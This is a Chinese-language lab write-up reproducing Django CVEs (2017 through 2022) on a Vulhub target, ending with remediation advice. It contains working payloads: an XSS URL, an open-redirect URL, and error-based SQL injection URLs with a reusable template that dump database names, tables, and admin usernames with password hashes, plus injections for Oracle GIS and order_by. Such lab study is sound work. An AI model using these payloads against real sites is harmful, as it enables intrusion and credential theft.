---
title: Django
published: 2026-10-26T10:00:00+08:00
description: 全面解析 Django 框架历年来的多个高危漏洞，涵盖 CVE-2017-12794（调试页面 XSS）、CVE-2018-14574（任意 URL 跳转）、以及 CVE-2019-14234 到 CVE-2022-34265 这五个发生在不同组件（JSONField、GIS、order_by、Trunc）中的 SQL 注入漏洞的原理分析与实战复现。
image: images/Pasted image 20261026094030.png
tags:
  - Vulhub
  - CVE
category: Vulhub靶场
draft: true
pinned: false
lang: zh-CN
author: Ynm
comment: true
---


| 项目          | 详情                                                                                                 |
| ----------- | -------------------------------------------------------------------------------------------------- |
| **攻击机**     | Kali Linux（IP：192.168.197.128）                                                                     |
| **靶机**      | Ubuntu Server 24.04（IP：192.168.197.88）                                                             |
| **CVSS 评分** | CVE-2017-12794: 6.1（中危） / CVE-2018-14574: 6.1（中危） / 多个 SQL注入: 8.8~9.8（高危/严重）                       |
| **典型漏洞编号**  | CVE-2017-12794 / CVE-2018-14574 / CVE-2019-14234 / CVE-2020-9402 / CVE-2021-35042 / CVE-2022-34265 |
| **影响组件**    | Django 1.11.x / 2.0.x / 2.2.x / 3.0.x / 3.2.x / 4.0.x （各漏洞具体影响版本不同）                                |
| **漏洞类型**    | 跨站脚本（XSS） / 任意 URL 跳转 / SQL 注入                                                                     |
| **利用条件**    | 开启 DEBUG 模式（XSS） / 特定中间件配置（跳转） / 用户输入被直接拼接至数据库查询（SQL 注入）                                           |
| **核心原理**    | 错误页面未转义HTML、重定向路径处理不当、ORM底层函数及特定字段（JSON、排序等）查询参数未严格过滤/参数化                                          |

## 一、漏洞原理

Django 作为 Python 最流行的 Web 框架之一，历史上出现过多个由于参数过滤不严导致的安全漏洞。本次复现主要包含以下几类：

1. **调试页面 XSS (CVE-2017-12794)**：在开启 `DEBUG = True` 时，若触发数据库唯一性约束报错，错误页面会将包含用户输入的错误信息直接渲染，未进行 HTML 转义，导致反射型 XSS。
2. **任意 URL 跳转 (CVE-2018-14574)**：当启用 `CommonMiddleware` 和 `APPEND_SLASH` 时，若存在以斜杠结尾的 URL 模式，攻击者访问 `//www.evil.com`，Django 会将其重定向，浏览器会将其解析为外部协议，造成开放重定向。
3. **多场景 SQL 注入**：
   * **CVE-2019-14234**：`JSONField` / `HStoreField` 的键名未严格过滤，导致注入。
   * **CVE-2020-9402**：GIS 查询中的容差参数存在注入。
   * **CVE-2021-35042**：`QuerySet.order_by()` 接收不可信输入，导致列位置注入。
   * **CVE-2022-34265**：`Trunc()` 和 `Extract()` 数据库函数的 `kind` / `lookup_name` 参数未受保护。

---

## 二、漏洞复现

### 1. CVE-2017-12794（调试页面 XSS）

当 Django 开启 `DEBUG = True` 时，如果程序抛出异常（如数据库唯一性约束报错），Django 会渲染一个详细的错误调试页面。由于该页面在渲染错误信息时，未对用户可控的输入进行 HTML 转义，攻击者可以将 JavaScript 代码注入到错误信息中，从而触发反射型跨站脚本攻击（XSS）。

**复现步骤**：

启动靶机（端口 8000），访问以下 URL 创建用户：
```text wrap
http://192.168.197.88:8000/create_user/?username=<script>alert(1)</script>
```
第一次访问会成功创建该用户；**再次访问**相同的 URL，会触发数据库唯一性约束错误。由于 DEBUG 模式开启，错误页面将在错误消息中包含未经转义的用户名（这里的用户名是`<script>alert(1)</script>`），错误页面渲染了我们的 `<script>` 标签，弹窗成功执行。


![](images/Pasted%20image%2020261026101202.png)
![](images/Pasted%20image%2020261026101233.png)

用户名中的 JavaScript 代码将在浏览器中执行，证实了 XSS 漏洞的存在。攻击者可以利用此漏洞在调试页面的上下文中执行任意 JavaScript 代码，可能导致会话劫持或其他客户端攻击。
### 2. CVE-2018-14574（任意 URL 跳转）

当项目启用了 `CommonMiddleware` 中间件和 `APPEND_SLASH` 设置时，如果存在接受以斜杠结尾的任意路径的 URL 模式，Django 在处理类似 `//www.example.com` 的请求时，会误认为它是一个内部路径并追加斜杠。浏览器接收到重定向响应后，会将 `//www.example.com` 解析为协议相对 URL（即绝对外部链接），从而导致开放重定向漏洞，常被用于钓鱼攻击。

**复现步骤**：

直接访问以下 URL：
```text wrap
http://192.168.197.88:8000//www.example.com
```
服务器将重定向到 `//www.example.com/`，浏览器会将其解释为绝对 URL，从而实现对外部站点的重定向：

**注意：**`www.example.com` 是互联网上一个**专门用于教学、文档和测试的“官方示例域名”**。它由国际互联网号码分配局（IANA）保留。简单来说，它就是一个**占位符** ，相当于数学题里的“小明”或“X”。
![](images/Pasted%20image%2020261026131715.png)
攻击者可以利用此漏洞将用户重定向到恶意网站，可能导致钓鱼攻击或其他安全问题。

### 3. CVE-2019-14234（JSONField SQL 注入）

当开发者在模型中使用 `JSONField` 或 `HStoreField` 字段，且允许用户控制查询集中的键名（如 `?detail__key=value`）时，Django 内部的查询构造器（QuerySet）未对键名进行严格的白名单过滤或安全转义，直接将其拼接到了底层 SQL 语句中，导致攻击者可以构造恶意的键名实施 SQL 注入。Django 自带的 admin 管理界面的过滤器默认受此漏洞影响。

**复现步骤**：

首先登录后台：`http://192.168.197.88:8000/admin/` （账号 `admin`，密码 `a123123123`，这个是 **Vulhub 靶场作者为了方便复现漏洞，人为提前写死在数据库里的**）。

访问 Collection 列表页，构造带有引号的 GET 参数触发报错注入：
```text wrap
http://192.168.197.88:8000/admin/vuln/collection/?detail__a%27b=123
```
页面返回错误，并在错误页面中泄露了 SQL 语句，证明注入成功。
![](images/Pasted%20image%2020261026134738.png)
**①数据库版本**
```text wrap
http://192.168.197.88:8000/admin/vuln/collection/?detail__a%27%29%20%3D%20%27%22123%22%27%20OR%201%3DCAST%28%28SELECT%20version%28%29%29%20AS%20int%29%20--%20=123
```
![](images/Pasted%20image%2020261026142831.png)
**②当前库 / 当前用户**
```text wrap
http://192.168.197.88:8000/admin/vuln/collection/?detail__a%27%29%20%3D%20%27%22123%22%27%20OR%201%3DCAST%28%28%27x%27%7C%7CCAST%28%28SELECT%20current_database%28%29%7C%7C%27%20%2F%20%27%7C%7Ccurrent_user%29%20AS%20text%29%29%20AS%20int%29%20--%20=123
```
当前库前面的 `x` 不要，这是命令自己加的。
![](images/Pasted%20image%2020261026143513.png)
**③所有表**
```text wrap
http://192.168.197.88:8000/admin/vuln/collection/?detail__a%27%29%20%3D%20%27%22123%22%27%20OR%201%3DCAST%28%28SELECT%20string_agg%28table_name%2C%27%2C%27%29%20FROM%20information_schema.tables%20WHERE%20table_schema%3D%27public%27%29%20AS%20int%29%20--%20=123
```
![](images/Pasted%20image%2020261026143702.png)
**④`auth_user` 的列名**
```text wrap
http://192.168.197.88:8000/admin/vuln/collection/?detail__a%27%29%20%3D%20%27%22123%22%27%20OR%201%3DCAST%28%28SELECT%20string_agg%28column_name%2C%27%2C%27%29%20FROM%20information_schema.columns%20WHERE%20table_name%3D%27auth_user%27%29%20AS%20int%29%20--%20=123
```
![](images/Pasted%20image%2020261026143803.png)
**⑤拖管理员账号和哈希（密码经过哈希加密）**
```text wrap
http://192.168.197.88:8000/admin/vuln/collection/?detail__a%27%29%20%3D%20%27%22123%22%27%20OR%201%3DCAST%28%28%27x%27%7C%7CCAST%28%28SELECT%20string_agg%28username%7C%7C%27%3A%27%7C%7Cpassword%2C%20%27%20%7C%20%27%29%20FROM%20auth_user%29%20AS%20text%29%29%20AS%20int%29%20--%20=123
```
管理员账号前面的 `x` 不要，这是命令自己加的。
![](images/Pasted%20image%2020261026144835.png)
总结一下，只替换 `(SELECT ...)` 里的 SQL，其余照抄模板：

```text wrap
a') = '"123"' OR 1=CAST((SELECT <SQL>) AS int) -- 
```

**注意**：上面数字结果要套一层 `('x'||CAST((SELECT <SQL>) AS text))`，否则转型成功、页面不回显（**哨兵写法**）。

在安全测试和编程中，**“哨兵”（Sentinel）** 通常指的是一个特殊的标记或值，它的作用是用来强制触发某种特定的逻辑，或者用来标记边界。在刚才复现的 SQL 注入漏洞里，“哨兵”指的是我们强行拼接到查询结果前面的那个字符 `x`。如果不加哨兵，会发生什么？在 PostgreSQL 的报错注入中，核心逻辑是让数据库执行 `CAST(查询结果 AS int)`。
- 如果查出来的结果是 `admin`（字母），转成整数必定失败，数据库报错：`invalid input syntax for integer: "admin"`。**我们成功拿到了数据。**
- **但是**，如果查出来的结果恰好是 `123`（数字），`CAST('123' AS int)` 就会**转换成功**。数据库不报错，页面正常刷新，**我们就什么都拿不到！**

因此，为了确保**无论查出来的是什么，都绝对会报错**，我们就派出了一个“哨兵”——字母 `x`。

Django 的密码哈希格式是：`算法$迭代次数$盐值$哈希值`。  现在我想要验证从数据库中得到的`pbkdf2_sha256$150000$bctj0Par4QXh$a+FJDHbNI8uJvRN0QdXkCtHTB063D2IiNUoKV7aOfqU=`是否是`a123123123`哈希加密后的结果，可以使用下面的python代码快速验证：
```python wrap
import hashlib
import base64

# 从你的哈希中提取的参数
password = "a123123123".encode('utf-8')
salt = "bctj0Par4QXh".encode('utf-8')
iterations = 150000
target_hash = "a+FJDHbNI8uJvRN0QdXkCtHTB063D2IiNUoKV7aOfqU="

# 用 pbkdf2_hmac 计算 SHA256 哈希
dk = hashlib.pbkdf2_hmac('sha256', password, salt, iterations)

# Django 会把算出来的二进制结果转成 Base64
calculated_hash = base64.b64encode(dk).decode('utf-8')

print(f"算出来的结果: {calculated_hash}")
print(f"数据库里的值: {target_hash}")
if calculated_hash == target_hash:
    print("✅ 验证成功！明文密码就是 a123123123")
else:
    print("❌ 验证失败，密码不对。")
```

![](images/Pasted%20image%2020261026145328.png)

得到了数据库中的管理员账号和密码，其他数据也可以按照此类似的方法获取，至此整个数据库已被拿下。
### 4. CVE-2020-9402（GIS 函数 SQL 注入）
**漏洞原理**：
Django 的 GIS（地理信息系统）查询功能中，某些空间查询函数（如 `distance_lte` 等）允许接收一个容差参数（tolerance）。由于框架未对该参数进行严格的数据类型校验和过滤，直接将其拼接进 SQL 语句，导致 SQL 注入。该漏洞主要影响使用 Oracle 数据库的业务环境。

**复现步骤**：
访问带有容差参数漏洞的接口，构造恶意 `q` 参数：
```text wrap
http://192.168.197.88:8000/vuln/?q=20) = 1 OR (select utl_inaddr.get_host_name((SELECT version FROM v$instance)) from dual) is null OR (1+1
```
SQL 错误回显，确认注入存在。

### 5. CVE-2021-35042（order_by SQL 注入）
**漏洞原理**：
当开发者将用户可控的输入直接传递给 `QuerySet.order_by()` 函数用于动态排序时，Django 未对传入的字段名（列名）进行有效性校验，允许包含特殊字符。攻击者可以通过构造恶意的排序参数闭合原有的 SQL 语句，并附加任意 SQL 查询（如报错注入、联合查询），从而获取数据库敏感信息。

**复现步骤**：
访问列表页，通过 `order` 参数注入报错语句：
```text wrap
http://192.168.197.88:8000/vuln/?order=vuln_collection.name);select updatexml(1, concat(0x7e,(select @@version)),1)%23
```
页面报错并回显数据库版本信息，利用成功。

### 6. CVE-2022-34265（Trunc/Extract SQL 注入）
**漏洞原理**：
Django 提供的数据库函数 `Trunc()` 和 `Extract()` 用于处理日期和时间提取。如果开发者将用户输入作为这两个函数的 `kind`（类型）或 `lookup_name` 参数传入，Django 未对其进行安全过滤就拼接到了数据库执行。攻击者通过传入包含单引号等特殊字符的参数，即可突破原有查询逻辑，实现报错注入。

**复现步骤**：
该应用使用 `Trunc` 函数按时间聚合数据。修改 `date` 参数注入恶意单引号：
```text wrap
http://192.168.197.88:8000/?date=xxxx'xxxx
```
Django 抛出数据库 OperationalError，证明 `date` 参数被拼接入 SQL 语句并导致了注入。

---
## 三、漏洞原理总结

| 漏洞编号 | 漏洞类型 | 触发入口 | 核心成因 |
| :--- | :--- | :--- | :--- |
| **CVE-2017-12794** | XSS | 数据库报错页 | 错误消息未进行 HTML 转义 |
| **CVE-2018-14574** | URL 跳转 | `//` 协议相对路径 | 路由规范化处理不当 |
| **CVE-2019-14234** | SQL 注入 | JSONField 键名 | 字段键名拼接时未转义 |
| **CVE-2020-9402** | SQL 注入 | GIS 查询参数 | 容差参数直接拼接 SQL |
| **CVE-2021-35042** | SQL 注入 | `order_by()` 参数 | 未限制排序字段的有效性 |
| **CVE-2022-34265** | SQL 注入 | `Trunc()` / `Extract()` | 聚合函数参数未受保护 |

**核心本质**：Django 作为一个重度依赖 ORM 的框架，大部分 SQL 注入都是因为在使用底层数据库函数、或者允许用户控制查询字段名（如排序、JSON 键名）时，没有使用参数化查询或白名单校验，导致恶意输入被直接拼接进了 SQL 语句。

---
## 四、修复方案

1. **及时升级版本**：将 Django 升级至官方安全公告中提到的安全版本及以上（如 LTS 版本）。
2. **关闭 DEBUG 模式**：生产环境绝对禁止开启 `DEBUG = True`，防止报错页面泄露敏感信息或引发 XSS。
3. **限制输入**：对于 `order_by()`、`Trunc()` 等接收字段名的函数，使用白名单限制用户输入，禁止直接将用户输入作为参数传递。
4. **配置 WAF 防护**：在网关层拦截常见的 SQL 注入特征（如 `updatexml`、`extractvalue`、单引号闭合等）。